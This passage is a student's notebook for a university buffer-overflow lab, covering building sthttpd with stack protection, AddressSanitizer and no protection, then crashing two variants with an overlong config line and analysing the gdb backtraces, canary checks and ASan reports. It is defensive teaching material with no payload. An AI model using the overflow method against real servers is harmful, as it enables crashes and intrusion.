@@ -1,0 +1,1440 @@
+Smashing Lab Note Book
+
+Purpose: 
+	This assignment investigates an old-fashioned 
+	way of breaking into systems executing x86 machine code, 
+	along with a couple of machine-level defenses against 
+	this attack.
+
+Source Assignment URL: 
+	http://web.cs.ucla.edu/classes/fall17/cs33/lab/smashinglab.html
+==========================================================================
+Basic
+
+1.Download the source files on lnxsrv09 (gcc version must be 7.2.0 or above)
+	curl -O curl -O http://web.cs.ucla.edu/classes/fall17/cs33/lab/sthttpd-2.27.0.tar.gz
+2.Unpack the tarball
+	 tar -xvf sthttpd-2.27.0.tar.gz
+
+3.Apply the patch (modify the source file)
+	Refer the source assignment url above.
+
+4.Build sthttpd with above patch applied.
+	in the sthttpd -2.27.0 directory
+	./configure LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"
+5.Compile with 3 different options with different names.
+	in the sthttpd -2.27.0 directory
+
+	SP.Strong stack protection
+		// Delete all files that are normally created by running make.
+		$ make clean
+		// compile with strong stack protection
+		$ make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'
+		// Rename the directory/file name
+		$ mv src/thttpd src/thttpd-sp
+
+	AS.Address sanitization
+		$ make clean
+		$ make CFLAGS='-g3 -O2 -fno-inline -fsanitize=address'
+		$ mv src/thttpd src/thttpd-as
+
+	NO.Neither
+		$ make clean
+		$ make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'
+		$ mv src/thttpd src/thttpd-no
+
+	
+	Explore each option
+		
+		SP: Strong Stack Protection
+		Folloing are summary of below url:
+		https://lwn.net/Articles/584225/
+			Behind Problem:
+				Stack buffer overflow:
+					The attackers can overwrite the return pointer on the stack;
+					therefore, they can control where the function returns.
+			Stack protection is one of GCC compiler feature which to help detect
+			buffer overflow.
+			Basic Idea:
+				Pushing a carnary(a randomly chosen integer) on the stack the address
+				just after the function return pointer which is pushed.
+				The canary value is then checked before the function returns:
+					if it is different, the program abort (since it means the attacker
+					overwirte the program)
+			Cons of SP:
+				Performance degradation due to:
+					-generating and checking carnary
+					-extra code needs to be added to handle above for each function
+				-> retrict sp to a subset of all the functins is a program.
+			 -> use options to pick which funtion to protect
+				-fstack-protector-all
+					: all functions
+				-fstack-protector
+					: function which has a char array of 8 bytes or more in stack.
+				-fstack-protector-strong
+					: the balance between above two options
+					 -> keep performance and sacrifice little security
+
+		AS: Address sanitization
+		Following are summary of below url:
+		https://www.usenix.org/system/files/conference/atc12/atc12-final39.pdf
+			Behind Problems:
+				memorry access bugs
+				buffer overflow
+				uses of freed heap memory
+			Basic Idea:
+				It employs simple a specialized memory allocator and code instrumentation.
+				Detect the above problems.
+				Two Parts in it.
+					1. instrumation module
+						modify the codes to check the shadow state for each memory access
+						and creates poisoned redzones around stack and global objects
+					2. run-time library
+						replaces malloc, free and related functions
+						it creates poisioned redzones around allocated heap regions, delays
+						the reuse of heap regions, and reprot the error
+
+		-zexecstack:
+			gcc use -noexectack as default, which is whenever there is an nonexecutable in the stack
+			The machine don't execute that.
+			and zexecstack will do opposite.
+			Even though there is an nonexcutable thin in the stack, execute anyway.
+			(https://www.win.tue.nl/~aeb/linux/hh/protection.html)
+
+6. Get the port on the server (12330 + 3 * (X % 293) + Y)
+		where:
+			X: student ID
+			Y: 1,2,3 with each SP, AP, NO respectively
+
+	
+	I don't know why but some reason my port numbert doen't work
+	and subtracting 1000 for each port number above, and the works
+	so I use
+	SP: 12117
+	AP: 12118
+	NO: 12119
+
+7. Invoke the server
+	src/thttpd-sp -p [port num above] -D
+
+		explore the options
+		 -D: for debugging
+		 	 prevent thttpd from making itself a background deamon.
+		 	 It runs in the foreground like a regular program.
+			 It is necessary when you want to run thttpd wrapped in a little shell
+			 script script that restarts if it exits.
+			 (http://www.acme.com/software/thttpd/thttpd_man.html)
+		 -p: specify the port number
+	
+	
+	src/thttpd-sp -p 12117 -D
+	src/thttpd-as -p 12118 -D
+	src/thttpd-no -p 12119 -D
+
+
+8. Checking if it is running
+	ps -u [server name] (masataka in my case)
+9.Veryfy the servers work in the normal case
+	Two steps:
+		1) create foo.txt in sthttpd02.27.0 directory
+			echo 'The server is running.' > foo.txt
+		2) curl http://localhost:[port num]/foo.txt
+			EX:
+				$ curl http://localhost:13117/foo.txt
+				should output 'the server is running' if it is working	
+10.Kill the server
+	kill [PID]
+		where PID can be found from ps -u command
+	to check whether it died or not use ps -u again	
+
+
+================================================================================================
+Start smashing...
+
+Problem 5. Make variant SP crash by invoking it in a suitable way. 
+   Run it under GDB, and get a backtrace immediately after the crash. 
+   Identify which machine instruction caused the crash, and why.
+
+
+	1. Invoke the server
+		src/thttpd-sp -p 12117 -D
+	2. Format of config.txt
+		Since we patched arr size 1000 => arr 100 in thethe read_config()
+		Let's choose words just 100 and just above the 100
+		VersionA:
+			"port=aaaaa.." upto total 100 words
+		VersionB:
+			"port=aaaaa.." upto total 101 words
+		VersionC:
+			"port=aaaaa.." upto total 102 words
+		VersionD:
+			"port=aaaaa.." upto total 103 words
+		VersionE:
+			"port=aaaaa.." upto total 104 words
+		VersionF:
+			"port=aaaaa.." upto total 105 words
+
+
+		
+		
+	3. Run under gdb command (open different terminal)
+		gdb --args src/thttpd-sp -p 12117 -D -C config.txt
+		(gdb) run
+	OR
+		gdb src/thttpd-sp
+		(gdb) run -p 12117 -D -C config.txt
+
+		options:
+			-C: Specifies a config-file to read. 
+				All options can be set either by command-line flags or in the config file.
+
+	4. Result of above
+		VersionA,B,C,D:
+			didn't crash the program	
+		
+		VersionE,F:
+			did crash the program
+
+			gdb's output for versionE
+			*** stack smashing detected ***: /w/home.05/cs/ugrad/masataka/Documents/lab3/sthttpd-2.27.0/src/thttpd-sp terminated
+			======= Backtrace: =========
+			/lib64/libc.so.6(__fortify_fail+0x37)[0x7ffff76e8d87]
+			/lib64/libc.so.6(__fortify_fail+0x0)[0x7ffff76e8d50]
+			/w/home.05/cs/ugrad/masataka/Documents/lab3/sthttpd-2.27.0/src/thttpd-sp[0x404edd]
+			/w/home.05/cs/ugrad/masataka/Documents/lab3/sthttpd-2.27.0/src/thttpd-sp[0x4052cf]
+			/w/home.05/cs/ugrad/masataka/Documents/lab3/sthttpd-2.27.0/src/thttpd-sp[0x403826]
+			/lib64/libc.so.6(__libc_start_main+0xf5)[0x7ffff75fac05]
+			/w/home.05/cs/ugrad/masataka/Documents/lab3/sthttpd-2.27.0/src/thttpd-sp[0x40438e]
+			======= Memory map: ========
+			00400000-00415000 r-xp 00000000 00:30 6264994                            /w/home.05/cs/ugrad/masataka/Documents/lab3/sthttpd-2.27.0/src/thttpd-sp
+			00614000-00615000 r--p 00014000 00:30 6264994                            /w/home.05/cs/ugrad/masataka/Documents/lab3/sthttpd-2.27.0/src/thttpd-sp
+			00615000-00617000 rw-p 00015000 00:30 6264994                            /w/home.05/cs/ugrad/masataka/Documents/lab3/sthttpd-2.27.0/src/thttpd-sp
+			00617000-00639000 rw-p 00000000 00:00 0                                  [heap]
+			7ffff6da0000-7ffff6db5000 r-xp 00000000 08:07 261138                     /usr/lib64/libgcc_s-4.8.5-20150702.so.1
+			7ffff6db5000-7ffff6fb4000 ---p 00015000 08:07 261138                     /usr/lib64/libgcc_s-4.8.5-20150702.so.1
+			7ffff6fb4000-7ffff6fb5000 r--p 00014000 08:07 261138                     /usr/lib64/libgcc_s-4.8.5-20150702.so.1
+			7ffff6fb5000-7ffff6fb6000 rw-p 00015000 08:07 261138                     /usr/lib64/libgcc_s-4.8.5-20150702.so.1
+			7ffff6fb6000-7ffff6fb8000 r-xp 00000000 08:07 261506                     /usr/lib64/libdl-2.17.so
+			7ffff6fb8000-7ffff71b8000 ---p 00002000 08:07 261506                     /usr/lib64/libdl-2.17.so
+			7ffff71b8000-7ffff71b9000 r--p 00002000 08:07 261506                     /usr/lib64/libdl-2.17.so
+			7ffff71b9000-7ffff71ba000 rw-p 00003000 08:07 261506                     /usr/lib64/libdl-2.17.so
+			7ffff71ba000-7ffff71bc000 r-xp 00000000 08:07 261558                     /usr/lib64/libfreebl3.so
+			7ffff71bc000-7ffff73bb000 ---p 00002000 08:07 261558                     /usr/lib64/libfreebl3.so
+			7ffff73bb000-7ffff73bc000 r--p 00001000 08:07 261558                     /usr/lib64/libfreebl3.so
+			7ffff73bc000-7ffff73bd000 rw-p 00002000 08:07 261558                     /usr/lib64/libfreebl3.so
+			7ffff73bd000-7ffff73d4000 r-xp 00000000 08:07 261773                     /usr/lib64/libpthread-2.17.so
+			7ffff73d4000-7ffff75d3000 ---p 00017000 08:07 261773                     /usr/lib64/libpthread-2.17.so
+			7ffff75d3000-7ffff75d4000 r--p 00016000 08:07 261773                     /usr/lib64/libpthread-2.17.so
+			7ffff75d4000-7ffff75d5000 rw-p 00017000 08:07 261773                     /usr/lib64/libpthread-2.17.so
+			7ffff75d5000-7ffff75d9000 rw-p 00000000 00:00 0 
+			7ffff75d9000-7ffff7791000 r-xp 00000000 08:07 261436                     /usr/lib64/libc-2.17.so
+			7ffff7791000-7ffff7991000 ---p 001b8000 08:07 261436                     /usr/lib64/libc-2.17.so
+			7ffff7991000-7ffff7995000 r--p 001b8000 08:07 261436                     /usr/lib64/libc-2.17.so
+			7ffff7995000-7ffff7997000 rw-p 001bc000 08:07 261436                     /usr/lib64/libc-2.17.so
+			7ffff7997000-7ffff799c000 rw-p 00000000 00:00 0 
+			7ffff799c000-7ffff79a4000 r-xp 00000000 08:07 261484                     /usr/lib64/libcrypt-2.17.so
+			7ffff79a4000-7ffff7ba3000 ---p 00008000 08:07 261484                     /usr/lib64/libcrypt-2.17.so
+			7ffff7ba3000-7ffff7ba4000 r--p 00007000 08:07 261484                     /usr/lib64/libcrypt-2.17.so
+			7ffff7ba4000-7ffff7ba5000 rw-p 00008000 08:07 261484                     /usr/lib64/libcrypt-2.17.so
+			7ffff7ba5000-7ffff7bd3000 rw-p 00000000 00:00 0 
+			7ffff7bd3000-7ffff7bda000 r-xp 00000000 08:07 266468                     /usr/lib64/librt-2.17.so
+			7ffff7bda000-7ffff7dd9000 ---p 00007000 08:07 266468                     /usr/lib64/librt-2.17.so
+			7ffff7dd9000-7ffff7dda000 r--p 00006000 08:07 266468                     /usr/lib64/librt-2.17.so
+			7ffff7dda000-7ffff7ddb000 rw-p 00007000 08:07 266468                     /usr/lib64/librt-2.17.so
+			7ffff7ddb000-7ffff7dfc000 r-xp 00000000 08:07 261713                     /usr/lib64/ld-2.17.so
+			7ffff7fcc000-7ffff7fd1000 rw-p 00000000 00:00 0 
+			7ffff7ff8000-7ffff7ffa000 rw-p 00000000 00:00 0 
+			7ffff7ffa000-7ffff7ffc000 r-xp 00000000 00:00 0                          [vdso]
+			7ffff7ffc000-7ffff7ffd000 r--p 00021000 08:07 261713                     /usr/lib64/ld-2.17.so
+			7ffff7ffd000-7ffff7ffe000 rw-p 00022000 08:07 261713                     /usr/lib64/ld-2.17.so
+			7ffff7ffe000-7ffff7fff000 rw-p 00000000 00:00 0 
+			7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]
+			ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
+
+			Program received signal SIGABRT, Aborted.
+			0x00007ffff760e1f7 in raise () from /lib64/libc.so.6
+	5. Backtrace the version E and F
+		
+		Immediately after crashing,
+		(gdb) bt
+
+		VersionE:
+			#0  0x00007ffff760e1f7 in raise () from /lib64/libc.so.6
+			#1  0x00007ffff760f8e8 in abort () from /lib64/libc.so.6
+			#2  0x00007ffff764df47 in __libc_message () from /lib64/libc.so.6
+			#3  0x00007ffff76e8d87 in __fortify_fail () from /lib64/libc.so.6
+			#4  0x00007ffff76e8d50 in __stack_chk_fail () from /lib64/libc.so.6
+			#5  0x0000000000404edd in read_config (filename=<optimized out>) at thttpd.c:1192
+			#6  0x00000000004052cf in parse_args (argc=6, argv=argv@entry=0x7fffffffe118) at thttpd.c:893
+			#7  0x0000000000403826 in main (argc=<optimized out>, argv=0x7fffffffe118) at thttpd.c:380
+
+		VersionF:
+			#0  0x00007ffff760e1f7 in raise () from /lib64/libc.so.6
+			#1  0x00007ffff760f8e8 in abort () from /lib64/libc.so.6
+			#2  0x00007ffff764df47 in __libc_message () from /lib64/libc.so.6
+			#3  0x00007ffff76e8d87 in __fortify_fail () from /lib64/libc.so.6
+			#4  0x00007ffff76e8d50 in __stack_chk_fail () from /lib64/libc.so.6
+			#5  0x0000000000404edd in read_config (filename=<optimized out>) at thttpd.c:1192
+			#6  0x00000000004052cf in parse_args (argc=6, argv=argv@entry=0x7fffffffe118) at thttpd.c:893
+			#7  0x0000000000403826 in main (argc=<optimized out>, argv=0x7fffffffe118) at thttpd.c:380
+
+	6.Why and how the above happened?
+	
+		Since the both versionE and F gave the same backtrace, and version E is closer to the boundary 100, 
+		I chose version E for examining how and why the program crushed.
+
+		By looking at the backtrace of #5, looks like the read_config function is the last function who called
+		in our program since the functions from #0 ~ #4 are the unmodifable for us, and they are doing error handlings.
+		Means the instruction around the 0x0000000000404edd
+		is suspecious.
+		To see the assember instruction after the 0x0000000000404edd
+		type
+		(gdb) disas 0x0000000000404edd
+		and it output many instruction which is executed.
+		What we need to focus is when the read_config function called __stack_chk_fail function, which is
+		0x0000000000404ed8 <+1320>:	callq  0x402480 <__stack_chk_fail@plt>
+		calling __stack_chk_fail is at 0x0000000000404ed
+		Since just above instructions from this is unrelated to the function calling, maybe
+		it jumped to 0x0000000000404ed from somewhere, which is
+		0x0000000000404e0b <+1115>:	callq  0x402410 <fclose@plt>
+		0x0000000000404e10 <+1120>:	mov    0x68(%rsp),%rax
+		0x0000000000404e15 <+1125>:	xor    %fs:0x28,%rax
+		0x0000000000404e1e <+1134>:	jne    0x404ed8 <read_config+1320>
+		0x0000000000404e24 <+1140>:	add    $0x70,%rsp
+		0x0000000000404e28 <+1144>:	pop    %rbx
+		0x0000000000404e29 <+1145>:	pop    %rbp
+		0x0000000000404e2a <+1146>:	pop    %r12
+		0x0000000000404e2c <+1148>:	pop    %r13
+		0x0000000000404e2e <+1150>:	pop    %r14
+		0x0000000000404e30 <+1152>:	retq   
+
+
+		At here, the functino jump the place where calls the __stack_chk_fail function
+		when the instruction 0x0000000000404e15(xor) gives nonzero numbers, which means
+		%fs:0x28 is not equal to %rax
+		
+		Now, let's see why and how that happened by seeing stack more detail.
+		mov    0x68(%rsp),%rax
+		what is in 0x68(%rsp)?
+				By looking at the begining of instructions
+				0x00000000004049c0 <+16>:	sub    $0x70,%rsp
+				0x00000000004049c4 <+20>:	mov    %fs:0x28,%rax
+				0x00000000004049cd <+29>:	mov    %rax,0x68(%rsp)
+				0x00000000004049d2 <+34>:	xor    %eax,%eax
+				0x00000000004049d4 <+36>:	callq  0x402870 <fopen@plt>
+
+				It is creating new stack memory space by subtracting 70 from rsp, and 
+				we are stroing %fs:0x28 into 0x68(%rsp).
+				What 0x68(%rsp) represents is just after the return address for read_config function.
+
+			Recalling that detail of strong stack protection above. 
+			Pushing a carnary(a randomly chosen integer) on the stack the address
+			just after the function return pointer which is pushed.
+			It is exaclty what above instruction is doing.
+			They store the carnary into 0x68(%rsp)
+			and checking later before the function returns
+			and if it is not same as before, meaning carnary was overwritten.
+			program jump to 0x404ed8 <read_config+1320>.
+
+		When exactly was the carnary overwritten??
+			By looking at C source code in read_config function (thttpd.c)
+			There fgets function which can store the config.txt into memory.
+			This is suspecious, so let's set a break point and see what they are storing.
+			(gdb) break read_config         //since we want to see fgets() called in read_config
+			(gdb) run
+			(gdb) breadk fgets
+			(gdb) set disassemble-next-line on
+			and repeat
+			(gdb) si
+			to see the each instruction
+			(gdb) step 
+			to skip one function
+			(gdb) info registers
+			to see the info in registers
+
+			 0x00000000004049ef <read_config+63>:	4c 89 e2	mov    %r12,%rdx
+			 0x00000000004049f2 <read_config+66>:	be e8 03 00 00	mov    $0x3e8,%esi
+			 0x00000000004049f7 <read_config+71>:	48 89 e7	mov    %rsp,%rdi
+			 0x00000000004049fa <read_config+74>:	e8 e1 db ff ff	callq  0x4025e0 <fgets@plt>
+			 
+			 At here, it calls fgets function, and by looking at third line I can see that
+			 they are passing stack pointer %rsp to %rdi, which correspond to the first argument.
+			 For fgets function, the 1st argument is for pointer to arrays, which is char line[100].
+			 So rdi has a pointer to beginning of char line[100] array.
+
+			 Let's trace this rdi, to see when fgets write to line[100] mem.
+
+			 Now by using 
+			 (gdb) info registers
+			 let's see what is the address of line[100]
+
+			 rdi            0x7fffffffcdd0	140737488342480
+			 rsp            0x7fffffffcdd0	0x7fffffffcdd0
+
+			 Also, let's obtain the address of return address of read_config and where
+			 the machine put the carnary.
+
+			 -Before expanding stack:
+			 rsp            0x7fffffffce40	0x7fffffffce40
+
+			 -0x00000000004049c0 <read_config+16>:	48 83 ec 70	sub    $0x70,%rsp
+			 rsp            0x7fffffffcdd0	0x7fffffffcdd0
+
+			 -the address of carnary
+			  mov    %fs:0x28,%rax
+			  mov    %rax,0x68(%rsp)
+			 rsp = 0x7fffffffcdd0 + 0x68 = 0x7fffffffce38
+
+			Now let's calculate using above addresses and check if our config.txt can overwrite
+			the carnary at 0x7fffffffce38 from starting address of array 7fffffffcdd0
+			Remember our config.txt file has 104words.
+
+			Our array size is 100, and data type is char, so it require 100 bytes.
+			Each memory of an address can contain 8bytes,so
+			
+			Below is what our stack looks like
+
+			lower address
+				0x7fffffffcdd0  c[0] ~ c[7]
+				  			    c[8] ~ c[15]
+							    c[16] ~ c[23]
+							    c[24] ~
+							    c[32] ~
+							    c[40] ~
+							    c[48] ~
+							    c[56] ~
+							    c[64] ~
+							    c[72] ~
+							    c[80] ~
+							    c[88] ~
+				0x7fffffffce30  c[96] ~ c[100] can contain upto c[103]  ----------line A
+				0x7fffffffce38 !!!!!!CARNARY!!!!!!                      ----------line B
+				0x7fffffffce40 RETURN ADDRESS
+			higher address
+	Conclusion:
+		From above and at the line A, we can clearly see the our buffer can
+		contain upto 104 bytes. If the word exceeds the 104 bytes, they start to
+		overwrite our carnary at line B.
+		But wait, we only use 104 words in confix.txt, which is 104 bytes, so 
+		it won't overwrite the carnary, but using buffer fully.
+		Why is that??
+		According to
+		http://www.cplusplus.com/reference/cstdio/fgets/
+		char * fgets ( char * str, int num, FILE * stream );
+		A terminating null character is automatically appended after the characters copied to str.
+		Yes, we caused the overwritten because of the extra byte which is null character that fgets function
+		appended automatically.
+		Null charcter will just overwrite the beginning of carnary address 0x7fffffffce38,
+		Therefore, when the machine check the carnary before the read_config function return,
+		the carnary value was changed!!!
+		So the program abort!!!!!!!!
+			
+====================================================================================================================================
+Problem6:Make variant AS crash by invoking it in a similar way. Similarly, get a backtrace for it, 
+		 and identify the machine instruction that crashed it and wy. 
+
+	1. Invoke the server	
+		src/thttpd-as -p 12118 -D
+		it gives you this
+		src/thttpd-as: error while loading shared libraries: libasan.so.4: wrong ELF class: ELFCLASS32
+
+		we need to fix the comiling the objective file with following
+		$ make clean
+		$ make CFLAGS='-g3 -O2 -fno-inline -fsanitize=address  -static-libasan'
+		$ mv src/thttpd src/thttpd-as
+
+		now, try to invoke again
+		and it works!!
+
+	2. Use the same config.txt as problem 5 and run under gdb
+		
+		gdb --args src/thttpd-as -p 12118 -D -C config.txt
+		(gdb) run
+		
+		Crash success???
+
+		OUTPUT:
+		[Thread debugging using libthread_db enabled]
+		Using host libthread_db library "/lib64/libthread_db.so.1".
+		=================================================================
+		==3993==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffffffccb4 at pc 0x000000441de4 bp 0x7fffffffcc10 sp 0x7fffffffc3c0
+		READ of size 106 at 0x7fffffffccb4 thread T0
+		#0 0x441de3 in __interceptor_strchr ../../../../gcc-7.2.0/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:466
+		#1 0x4feb57 in read_config /u/cs/ugrad/masataka/Documents/lab3/sthttpd-2.27.0/src/thttpd.c:1020
+		#2 0x4ff666 in parse_args /u/cs/ugrad/masataka/Documents/lab3/sthttpd-2.27.0/src/thttpd.c:893
+		#3 0x408826 in main /u/cs/ugrad/masataka/Documents/lab3/sthttpd-2.27.0/src/thttpd.c:380
+		#4 0x7ffff6cc2c04 in __libc_start_main (/lib64/libc.so.6+0x21c04)
+		#5 0x409a69  (/w/home.05/cs/ugrad/masataka/Documents/lab3/sthttpd-2.27.0/src/thttpd-as+0x409a69)
+
+		Address 0x7fffffffccb4 is located in stack of thread T0 at offset 132 in frame
+		#0 0x4feaaf in read_config /u/cs/ugrad/masataka/Documents/lab3/sthttpd-2.27.0/src/thttpd.c:1000
+
+		This frame has 1 object(s):
+	  	[32, 132) 'line' <== Memory access at offset 132 overflows this variable
+	    HINT: this may be a false positive if your program uses some custom stack unwind mechanism or swapcontext
+		(longjmp and C++ exceptions *are* supported)
+		SUMMARY: AddressSanitizer: stack-buffer-overflow 
+				 ../../../../gcc-7.2.0/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:466 in __interceptor_strchr Shadow bytes around the buggy address:
+		0x10007fff7940: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+		0x10007fff7950: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+		0x10007fff7960: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+		0x10007fff7970: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+		0x10007fff7980: 00 00 00 00 00 00 f1 f1 f1 f1 00 00 00 00 00 00
+	    =>0x10007fff7990: 00 00 00 00 00 00[04]f2 f2 f2 f3 f3 f3 f3 00 00
+		0x10007fff79a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+		0x10007fff79b0: 00 00 00 00 f1 f1 f1 f1 04 f2 f2 f2 f2 f2 f2 f2
+		0x10007fff79c0: 04 f2 f2 f2 f2 f2 f2 f2 00 00 f2 f2 f2 f2 f2 f2
+		0x10007fff79d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+		0x10007fff79e0: f2 f2 f2 f2 00 00 00 00 00 00 00 00 00 00 00 00
+		Shadow byte legend (one shadow byte represents 8 application bytes):
+		Addressable:           00
+		Partially addressable: 01 02 03 04 05 06 07 
+		Heap left redzone:       fa
+		Freed heap region:       fd
+		Stack left redzone:      f1
+		Stack mid redzone:       f2
+	 	Stack right redzone:     f3
+		Stack after return:      f5
+		Stack use after scope:   f8
+		Global redzone:          f9
+		Global init order:       f6
+		Poisoned by user:        f7
+		Container overflow:      fc
+		Array cookie:            ac
+		Intra object redzone:    bb
+		ASan internal:           fe
+		Left alloca redzone:     ca
+		Right alloca redzone:    cb
+		==3993==ABORTING
+		[Inferior 1 (process 3993) exited with code 01]
+
+	3.Backtrace
+		Output:
+			No stack.
+
+		Something wrong with this.
+		Let me change the config.txt version and try the same thing.
+
+	
+		VersionG:
+			"port=aaaaa.." upto total 216 words
+		VersionH:
+			"port=aaaaa.." upto total 217 words
+
+		When the word is 104 to 216 words, it gives the error like above
+		and also it output No stack when I applied backtrace.
+
+		However, when I change to 217 words. It behaved differently.
+
+		Output:
+			[Thread debugging using libthread_db enabled]
+			Using host libthread_db library "/lib64/libthread_db.so.1".
+			=================================================================
+			==36030==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffffffccb4 at pc 0x000000441de4 bp 0x7fffffffcc10 sp 0x7fffffffc3c0
+			READ of size 219 at 0x7fffffffccb4 thread T0
+
+			Program received signal SIGSEGV, Segmentation fault.
+			0x00007ffff7073118 in ?? () from /lib64/libgcc_s.so.1
+		
+		BackTrace:
+			#0  0x00007ffff7073118 in ?? () from /lib64/libgcc_s.so.1
+			#1  0x00007ffff7074019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+			#2  0x00000000004d1863 in __sanitizer::BufferedStackTrace::SlowUnwindStack (this=0x7fffffffaec0, 
+			    pc=4464100, max_depth=<optimized out>)
+				at ../../../../gcc-7.2.0/libsanitizer/sanitizer_common/sanitizer_unwind_linux_libcdep.cc:123
+			#3  0x0000000000419d7f in __asan::GetStackTraceWithPcBpAndContext (fast=false, context=0x0, 
+				bp=140737488342032, pc=4464100, max_depth=256, stack=0x7fffffffaec0)
+				at ../../../../gcc-7.2.0/libsanitizer/asan/asan_stack.h:50
+			#4  __asan::ErrorGeneric::Print (this=this@entry=0x980148 <__asan::ScopedInErrorReport::current_error_+8>)
+				at ../../../../gcc-7.2.0/libsanitizer/asan/asan_errors.cc:482
+			#5  0x00000000004ccae8 in __asan::ErrorDescription::Print (
+				this=0x980140 <__asan::ScopedInErrorReport::current_error_>)
+				at ../../../../gcc-7.2.0/libsanitizer/asan/asan_errors.h:360
+			#6  __asan::ScopedInErrorReport::~ScopedInErrorReport (this=0x7fffffffb737, __in_chrg=<optimized out>)
+				at ../../../../gcc-7.2.0/libsanitizer/asan/asan_report.cc:167
+			#7  __asan::ReportGenericError (pc=4464100, bp=bp@entry=140737488342032, sp=sp@entry=140737488339904, 
+				addr=addr@entry=140737488342196, is_write=is_write@entry=false, access_size=access_size@entry=219, 
+				exp=0, fatal=false) at ../../../../gcc-7.2.0/libsanitizer/asan/asan_report.cc:397
+			#8  0x0000000000441e03 in __interceptor_strchr (s=<optimized out>, c=<optimized out>)
+				at ../../../../gcc-7.2.0/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:466
+			#9  0x00000000004feb58 in read_config (filename=<optimized out>) at thttpd.c:1020
+			#10 0x0000000000000a61 in ?? ()
+			#11 0x00007fffffffce80 in ?? ()
+			#12 0x00007fffffffe000 in ?? ()
+			#13 0x00007fffffffe410 in ?? ()
+			#14 0x00007fffffffcdc0 in ?? ()
+			#15 0x00007fffffffce00 in ?? ()
+			#16 0x0000000000408827 in main (argc=<optimized out>, argv=<optimized out>) at thttpd.c:380j
+
+			It succesuflly crash the code, and also gave me the backtrace.
+			I'll use the version H of config.txt
+
+
+	4.Why and how it happened.
+
+		Similary to problem 5.
+		By looking at the backtrace above, the problem caused in the read_config function
+		#9  0x00000000004feb58 in read_config (filename=<optimized out>) at thttpd.c:1020
+		and then, they called
+		#8  0x0000000000441e03 in __interceptor_strchr (s=<optimized out>, c=<optimized out>)
+			at ../../../../gcc-7.2.0/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:466
+
+		Let's see when they called it by seeing assembly code.
+
+		(gdb) disas 0x00000000004feb58 
+
+		I found there are two instruction which call the __interceptor_strchr
+		
+		A. 
+			0x00000000004feb53 <+179>:	callq  0x442050 <__interceptor_strchr(char const*, int)>
+
+		B.
+			0x00000000004fec08 <+360>:	callq  0x442050 <__interceptor_strchr(char const*, int)>
+
+		Unlike the problem 5, these functions are called without any jump conditions.
+		One of them must call the 
+		#7  __asan::ReportGenericError (pc=4464100, bp=bp@entry=140737488342032, sp=sp@entry=140737488339904,
+		which meas it detect the error.
+
+		Let's find out which  of them caused this by setting up break point to above.
+		(gdb) break read_config
+		(gdb) run
+		(gdb) break *0x00000000004feb53
+		(gdb) break *0x00000000004fec08
+		(gdb) set disassemble-next-line on
+		use
+		(gdb) c
+		to go to next break point
+		
+		By doing this, I couldn't detect the 3rd break point, which means we didn't execute
+		the part B of __interceptor_strchr.
+		(gdb) info breakpoints
+		Num     Type           Disp Enb Address            What
+		1       breakpoint     keep y   0x00000000004feaa0 in read_config at thttpd.c:1000
+			breakpoint already hit 1 time
+		2       breakpoint     keep y   0x00000000004feb53 in read_config at thttpd.c:1020
+			breakpoint already hit 1 time
+		3       breakpoint     keep y   0x00000000004fec08 in read_config at thttpd.c:1037
+
+		Therefore, let's ignore part B and exploer insturctions around part A
+		b0x00000000004feb3d <+157>:	callq  0x406260 <fgets@plt>
+		0x00000000004feb42 <+162>:	test   %rax,%rax
+		0x00000000004feb45 <+165>:	je     0x4ff046 <read_config+1446>
+		0x00000000004feb4b <+171>:	mov    $0x23,%esi
+		0x00000000004feb50 <+176>:	mov    %r12,%rdi
+		0x00000000004feb53 <+179>:	callq  0x442050 <__interceptor_strchr(char const*, int)>
+		
+		Again, by setting breakpoints at 0x00000000004feb3, I figured out that this
+		fgets function corresponds to 
+		while ( fgets( line, 1000, fp ) != (char*) 0 ) in C source code, where we found it as the 
+		error causing in problem5.
+		
+		Now, what is __interceptor_strchr(char const*, int)?
+		Is this called when there is error? Or it should be called all the time.
+		Let's test by chagning config.txt to about 50 words, which shouldn't cause
+		any error. And see if it is executing the above function or not.
+		By observing the each instruction and jump, we found out that in this case,
+		Not only the first __interceptor_strchr function, they also execute the 
+		second one too which is different behavior from the previous config.txt.
+		1       breakpoint     keep y   0x00000000004feaa0 in read_config at thttpd.c:1000
+			breakpoint already hit 1 time
+		2   	breakpoint     keep y   0x00000000004feb42 in read_config at thttpd.c:1017
+			breakpoint already hit 1 time
+		3       breakpoint     keep y   0x00000000004fec08 in read_config at thttpd.c:1037
+			breakpoint already hit 1 time
+
+
+		From this observation, it is natural to think that error was detected in the function
+		__interceptor_strchr, rather than read_confing function like previous problem.
+		Let's exploer more about __interceptor_strchr and what are they doing.
+
+
+		First, let's figure out what are we passing.
+		It is natural to think it is passing the line[100] to them.
+			So first let's find out the address of line[100]. and Then
+			check it is really passing that array or not.
+			We can find out by set breakpoints at where we call fgets,
+			since right before the calling, we must pass the array address
+			as a first argument. 
+			0x00000000004feb3a <+154>:	mov    %r12,%rdi
+			0x00000000004feb3d <+157>:	callq  0x406260 <fgets@plt>
+			(gdb) break *0x00000000004feb3a
+			rdi            0x7fffffffcc50	140737488342096
+			r12            0x7fffffffcc50
+
+		The starting address of array is 0x7fffffffcc50.
+
+		Now, let's check what are we pass the __interceptro_strchr
+		rdi            0x7fffffffcc50	140737488342096
+		which is the same as above, so we are passing the starting address of
+		line[100] array.
+		Also, for second argument, it's easy to see that we are passing 23, as second arg.
+		so
